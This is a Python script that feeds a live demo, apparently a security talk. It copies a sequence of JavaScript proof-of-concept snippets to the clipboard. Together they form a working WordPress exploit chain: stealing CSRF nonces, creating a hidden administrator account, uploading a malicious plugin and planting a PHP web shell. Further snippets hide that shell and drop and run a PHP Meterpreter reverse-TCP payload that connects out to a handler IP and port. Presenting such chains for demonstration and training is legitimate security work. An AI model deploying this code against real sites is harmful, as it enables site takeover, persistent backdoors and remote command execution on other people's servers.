#!/bin/python
#
#
# Simple script to copy blocks of code (e.g. functions)
# to the clip board when a number is entered (1, 2, 3)
# For demos where I'm building up code over time
# This script will copy the right code into the clipboard
# when I need it with minimal distrction from the talk
#
# This will put the code into the middle mouse button past
# buffer
#
# Drew Kirkpatrick
# drew.kirkpatrick@gmail.com
# @hoodoer
#

import os



# So this is terrible. Hopefully no
# one ever looks at this code. 
def copyToClipboard(code):
	f = open("./tempFile.txt", "w+")

	f.write(code)
	f.close()

	cmd = "xclip -i ./tempFile.txt"
	os.system(cmd)



# First demo code, 
# simple alert popup
def one():
	code = """
function helloWorld()
{
	alert("Hello world!");
}
	"""

	copyToClipboard(code)

	return "Hello world code ready..."










# First version of add user, missing the nonce
def two():
	code = """
function addAdminUser()
{
	var uri = "/wp-admin/user-new.php";

	// The following user will be added as an Administrator level user
	var username  = "sleevelessCyberBandits";
	var email     = "tester@tester.com"
	var firstName = "trevor";
	var lastName  = "roach";
	var password  = "toor";

	xhr = new XMLHttpRequest();
	xhr.open("POST", uri);

 	xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

	var body = "action=createuser&"
	body += "_wp_http_referer=%2Fwp-admin%2Fuser-new.php&"
	body += "user_login=" + username + "&";
	body += "email=" + email + "&";
	body += "first_name=" + firstName + "&";
	body += "last_name=" + lastName + "&";
	body += "uri=&";
	body += "pass1=" + password + "&";
	body += "pass1-text=" + password + "&";
	body += "pass2=" + password + "&";
	body += "pw_weak=on&";
	body += "send_user_notification=0&";
	body += "role=subscriber&";
	body += "ure_select_other_roles=administrator&"; // muahahahaha 
	body += "ure_other_roles=administrator&"; // insert Dr. Evil second muahahahaha
	body += "createuser=Add+New+User";

	xhr.send(body);
}	
	"""

	copyToClipboard(code)

	return "Add Admin User v1 ready..."







# Code to find "add user" nonce
def three():
	code = """
function read_body(xhr) 
{ 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}



// Parse out the nonce value then pass to the add user function
function findNonce()
{
	var uri = "/wp-admin/user-new.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce_create-user" value="');
			var nonceVal = response.substring(noncePos+35, noncePos+45);

			console.log("Our nonce is: " + nonceVal);
		}
	}
}
	"""

	copyToClipboard(code)

	return "Nonce huntin' code ready..."








# Woohoo! Working admin user!
def four():
	code = """
// Parse out the nonce value then pass to the add user function
function addAdminUser()
{
	var uri = "/wp-admin/user-new.php";

	// The following user will be added as an Administrator level user
	var username  = "sleevelessCyberBandits";
	var email     = "tester@tester.com"
	var firstName = "trevor";
	var lastName  = "roach";
	var password  = "toor";



	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce_create-user" value="');
			var nonceVal = response.substring(noncePos+35, noncePos+45);

			xhr = new XMLHttpRequest();
			xhr.open("POST", uri);

 			xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

			var body = "action=createuser&"
			body += "_wpnonce_create-user=" + nonceVal + "&"; 
			body += "_wp_http_referer=%2Fwp-admin%2Fuser-new.php&"
			body += "user_login=" + username + "&";
			body += "email=" + email + "&";
			body += "first_name=" + firstName + "&";
			body += "last_name=" + lastName + "&";
			body += "uri=&";
			body += "pass1=" + password + "&";
			body += "pass1-text=" + password + "&";
			body += "pass2=" + password + "&";
			body += "pw_weak=on&";
			body += "send_user_notification=0&";
			body += "role=subscriber&";
			body += "ure_select_other_roles=administrator&"; // muahahahaha 
			body += "ure_other_roles=administrator&"; // insert Dr. Evil second muahahahaha
			body += "createuser=Add+New+User";

			xhr.send(body);
		}
	}
}
	"""

	copyToClipboard(code)

	return "Final form add admin user func ready..."








# Find the plugin nonce, nothing else yet
def five():
	code = """
function installYertleShell()
{
	console.log("Starting add plugin, hunting for the nonce...");

	var uri = "/wp-admin/plugin-install.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce" value="');
			console.log("Nonce position: " + noncePos);

			var nonceVal = response.substring(noncePos+23, noncePos+33);
			console.log("Nonce value: " + nonceVal);
		}
	}
}
	"""

	copyToClipboard(code)

	return "Get add plugin nonce ready..."








# Phewww this is a lot. And it's missing the actual binary
# and parsing of installation directory. Note the extra 
# escapes needed below for this to come through 
# correctly
def six():
	code = """
var webShellPath    = "shell/shell.php";


function installYertleShell()
{
	console.log("Starting add plugin, hunting for the nonce...");

		// console.log("Starting getNonce...");
	var uri = "/wp-admin/plugin-install.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce" value="');
			console.log("Nonce position: " + noncePos);

			var nonceVal = response.substring(noncePos+23, noncePos+33);
			console.log("Nonce substring: " + nonceVal);

			// Now we have the nonce, we need to add the plugin....


			// This data buffer should be your 
			// PHP plugin zip file. 
			var pluginZipFile = '\\x41\\x42\\x43';


			var fileSize = pluginZipFile.length;

			var boundary = "---------------------------82520842616842250352141452311";

			var uploadURI = "/wp-admin/update.php?action=upload-plugin";

			uploadXhr = new XMLHttpRequest();
			uploadXhr.open("POST", uploadURI, true);

			uploadXhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
			uploadXhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
			uploadXhr.setRequestHeader("Upgrade-Insecure-Requests", "1");

			var body = "--" + boundary + "\\r\\n";
			body += 'Content-Disposition: form-data; name="_wpnonce"' + '\\r\\n\\r\\n';
			body += nonceVal + "\\r\\n"; 

			body += "--" + boundary + "\\r\\n";
			body += 'Content-Disposition: form-data; name="_wp_http_referer"' + "\\r\\n\\r\\n";
			body += "/wp-admin/plugin-install.php" + "\\r\\n";


			body += "--" + boundary + "\\r\\n";
			body += 'Content-Disposition: form-data; name="pluginzip"; filename="shell.zip"' + "\\r\\n";
			body += "Content-Type: application/zip" + "\\r\\n\\r\\n";
			body += pluginZipFile + "\\r\\n";

			body += "--" + boundary + "\\r\\n";
			body += 'Content-Disposition: form-data; name="install-plugin-submit"' + "\\r\\n\\r\\n";
			body += "Install Now" + "\\r\\n";
			body += boundary + "--\\r\\n\\r\\n";

			var aBody = new Uint8Array(body.length);
			for (var i = 0; i < aBody.length; i++)
			{
				aBody[i] = body.charCodeAt(i);
			}
			uploadXhr.send(new Blob([aBody]));

			console.log("Done uploading malicious plugin");
		}
	}
}
	"""

	copyToClipboard(code)

	return "Hollowed out add plugin ready..."







def seven():
	code = """
			// We need to know path to our shell, so we need to know where
			// WordPress installed it. Let's parse the path
			// out from the response since this isn't always
			// what we expect...
			uploadXhr.onreadystatechange = function()
			{
				if (uploadXhr.readyState == XMLHttpRequest.DONE)
				{
					var response   = read_body(uploadXhr);
					var startIndex = response.indexOf('<p>Plugin installed successfully.</p>');
					var endIndex   = response.indexOf('target="_parent">Activate Plugin</a>');
					var pluginPath = response.substring(startIndex + 119, endIndex-26);
	
					pluginPath = pluginPath.replace("%2F", "/");
					window.webShellPath = pluginPath;
	
					// Pull the directory name out so we can
					// set the meterpreter directory
					var pluginDir = pluginPath.split("/");
					window.phpMetShellPath = pluginDir[0] + "/meterpreter.php";
				}
			} 
	"""

	copyToClipboard(code)

	return "Plugin Install Path Parser snippet ready..."







# Extra escaping needed below
def eight():
	code = """
const sleep = (milliseconds) => 
{
	return new Promise(resolve => setTimeout(resolve, milliseconds))
}




async function hideYertleShell()
{
	// Make sure there isn't an extra carriage return
	// at the end of the file here
	var payload =`<?php
    $command = $_GET["cmd"];
    $command = substr($command, 0, -1);
    $command = base64_decode($command);

    if (class_exists('ReflectionFunction')) {
       $function = new ReflectionFunction('system');
       $thingy = $function->invoke($command );

    } elseif (function_exists('call_user_func_array')) {
       call_user_func_array('system', array($command));

    } elseif (function_exists('call_user_func')) {
       call_user_func('system', $command);

    } else {
       system($command);
    }

    ?>`;

	var encodedPayload = btoa(payload);

	var cmd = "php -r \'echo base64_decode(\"" + encodedPayload + "\");\' > shell.php\\n";
	var encodedCmd = btoa(cmd);


	// Before we sent this, we first  need to make sure the wordpress
	// server has finished installing the yertle plugin
	// since this function needs the shell in order
	// to overwrite itself
	while (true)
	{
		// this might get updated if the wordpress server
		// ends up installing this someplace we didnt'
		// expect. It's global, so if another async function
		// updates it to the correct path, this should get
		// updated and fall through correctly
		var testUri = "/wp-content/plugins/" + webShellPath;

		var xhr = new XMLHttpRequest();
		xhr.open('GET', testUri, false);  
		xhr.send(null);

		if (xhr.status == 200) 
		{
  			//console.log("!! Our shell is ready!");
  			break;
		}
		if (xhr.status == 404)
		{
			console.log("Shell isn't there yet...");
			await sleep(5000);
			continue;
		}
	}

	var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + encodedCmd;

	console.log("About to overwrite the shell.php to hide it in the UI...");
	xhr = new XMLHttpRequest();
	
	xhr.open("GET", uri, true);
	xhr.send(null);
}
	"""

	copyToClipboard(code)

	return "Hide 'n seek time..."





# Extra escaping needed below
def nine():
	code = """
// Set your handler's IP and port below.
async function openPhpMeterpreterSession()
{
	// This is the listening IP and port 
	// for the meterpreter handler. 
	// This is the php/meterpreter/reverse_tcp 
	// payload for the handler
	var handlerIP   = "192.168.78.135";
	var handlerPort = "4444";

	var metPhpCommand = `<?php
    error_reporting(0);
    $ip   = '` + handlerIP + "';";

    metPhpCommand += "$port = "+ handlerPort + ";";

   	metPhpCommand += `
   	if (($f = 'stream_socket_client') && is_callable($f)) {
        $s      = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
    } elseif (($f = 'fsockopen') && is_callable($f)) {
        $s      = $f($ip, $port);
        $s_type = 'stream';
    } elseif (($f = 'socket_create') && is_callable($f)) {
        $s   = $f(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            die();
        }
        $s_type = 'socket';
    } else {
        die('no socket funcs');
    }
    if (!$s) {
        die('no socket');
    }
    switch ($s_type) {
        case 'stream':
            $len = fread($s, 4);
            break;
        case 'socket':
            $len = socket_read($s, 4);
            break;
    }
    if (!$len) {
        die();
    }
    $a   = unpack("Nlen", $len);
    $len = $a['len'];
    $b   = '';
    while (strlen($b) < $len) {
        switch ($s_type) {
            case 'stream':
                $b .= fread($s, $len - strlen($b));
                break;
            case 'socket':
                $b .= socket_read($s, $len - strlen($b));
                break;
        }
    }
    $GLOBALS['msgsock']      = $s;
    $GLOBALS['msgsock_type'] = $s_type;
    eval($b);
    die();
    ?>`;

    var payload = btoa(metPhpCommand);
    var commandValue = "php -r \'echo base64_decode(\"" + payload + "\");\' > meterpreter.php\\n";
    var encodedCommand = btoa(commandValue);


    // We can't use the uploaded shell to write the meterpretery shell
    // until it's fully installed, check to make sure it's there...
    while (true)
	{
		var testUri = "/wp-content/plugins/" + webShellPath;
		var xhr = new XMLHttpRequest();
		xhr.open('GET', testUri, false);  
		xhr.send(null);

		if (xhr.status == 200) 
		{
  			//console.log("!! Our shell is ready!");
  			break;
		}
		if (xhr.status == 404)
		{
			//console.log("Shell is still 404'ing...");
			await sleep(5000);
			continue;
		}
	}

    // Ok, let's upload our meterpreter php file...
	var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + encodedCommand;
    xhr = new XMLHttpRequest();
	
	xhr.open("GET", uri, true);
	xhr.send(null);

	console.log("PHP Meterpreter shell uploaded...");

	// 10 seconds should be more than
	// enough for the meterpreter shell to
	// be there
	await sleep(10000);

	console.log ("Sending command to execute shell...");
    commandValue = "php meterpreter.php";
    payload = btoa(commandValue);

    var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + payload;

    xhr.open("GET", uri, true);
	xhr.send(null);

	 // insert shell happy dance here
}
	"""

	copyToClipboard(code)

	return "Turtles?"






def gimmeOuttaHere():
	print "Later folks :wave:"
	exit()
	





def handleInput(input):
	switcher = {
        1: one,
        2: two,
        3: three,
        4: four,
        5: five,
        6: six,
        7: seven,
        8: eight,
        9: nine,
        exit: gimmeOuttaHere,
        quit: gimmeOuttaHere
	}

	# Get the function from switcher dictionary
	func = switcher.get(input, lambda: "Invalid Input")
    # Execute the function
	print func()
	print


def main():
	print "Demo code DJ ready to serve up some wonky POCs baby"


	while True:
		userInput = input("So whatcha want? ")
		handleInput(userInput)
		


if __name__ == "__main__":
    main()
